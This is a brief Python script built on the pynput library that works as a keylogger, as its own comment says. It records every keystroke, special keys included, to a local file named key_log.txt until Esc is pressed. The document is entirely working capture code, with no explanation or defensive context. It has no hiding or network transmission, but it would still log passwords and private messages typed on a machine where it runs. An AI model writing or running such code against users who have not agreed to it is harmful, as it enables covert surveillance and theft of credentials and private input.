from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        # Log the key press
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open("key_log.txt", "a") as log_file:
            log_file.write(f" {key} ")

def on_release(key):
    # Stop the keylogger when 'Esc' key is pressed
    if key == Key.esc:
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
